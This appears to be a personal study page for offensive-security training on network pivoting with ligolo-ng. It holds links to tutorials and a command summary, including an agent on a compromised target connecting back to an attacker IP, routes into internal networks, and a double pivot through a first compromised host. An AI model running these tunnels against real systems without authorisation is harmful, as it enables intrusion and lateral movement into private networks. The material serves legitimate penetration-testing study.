# Pivoting (Tunneling & Forwarding)

{% embed url="https://www.reddit.com/r/oscp/comments/1akvtwe/ligolo_chisel_and_painfully_slow_nmap_scans/" fullWidth="false" %}

{% hint style="info" %}
Upload nmap binary to compromised machine and scan from there instead of scanning via ligolo incase it don't work
{% endhint %}

{% embed url="https://medium.com/@raphaeltzy13/pivoting-with-ligolo-active-directory-82a86d739409" %}

{% embed url="https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16" %}
finish revshells and callback section
{% endembed %}

{% embed url="https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/" %}
In this one, for double pivot, first session is closed and new direct link is made with machine 2 and kali
{% endembed %}

{% embed url="https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9" %}
Add 240.0.0.1 to ip route instead of target IP, all ports will be forwarded to this IP eg. 240.0.0.1:8080 will show the website hosted on target which wasn't accessible earlier
{% endembed %}

{% embed url="https://www.linkedin.com/pulse/bidirectional-port-forwarding-ligolo-ng-saathwick-venkataramalingam-grwuc" %}

```
Wreath -> invoke-portscan.ps1 comms mentioned too (instead of nmap)
```

### Summary

```
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up
ligolo -selfcert 
#Accepts connections at port 443

TARGET
.\agent.exe -connect <attacker IP here>:11601 -retry -ignore-cert

KALI
session
1
ifconfig
add IP of internal network to our route
NEW TAB
sudo ip route add xxx.xxx.xxx.0/24 dev ligolo
ip route list
BACK TO LIGOLO
start
```

To perform port forwarding, before start

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

#### Double Pivot

New interface `ligolo-double` now

```
EXISTING SESSION
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list
./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert
KALI
NEW TAB
sudo ip add route <New_Network> dev ligolo-double
session
2
tunnel_start --tun ligolo-double
```
